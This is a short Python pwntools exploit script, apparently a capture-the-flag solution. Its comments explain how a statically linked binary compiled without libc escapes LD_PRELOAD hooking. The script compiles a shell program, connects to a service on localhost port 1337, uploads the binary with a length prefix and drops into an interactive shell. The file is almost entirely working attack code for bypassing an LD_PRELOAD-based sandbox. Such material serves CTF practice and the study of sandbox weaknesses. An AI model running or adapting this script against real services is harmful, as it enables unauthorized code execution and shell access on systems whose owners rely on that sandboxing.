#!/usr/bin/env python3

# LD_PRELOAD is applied by ld - it is possible to compile a binary statically
# so that ld won't be used at all, and hence nothing will act on LD_PRELOAD
# such an executable can't use dynamic libraries (including libc),
# one could either statically link all the libs or just not use any

from pwn import *
import subprocess
import struct

# -nostdlib -nostartfiles -static makes program not use libc and ld
# ld is what actually reads LD_PRELOAD and acts on it
s=subprocess.run('gcc -nostdlib -nostartfiles -masm=intel shell.c -static -o shell', shell=True)
print(s)

with open('shell', 'rb') as f:
    shell_exec = f.read()

target = remote('127.0.0.1', 1337)
target.send(struct.pack('!H', len(shell_exec)))
target.send(shell_exec)
target.interactive()
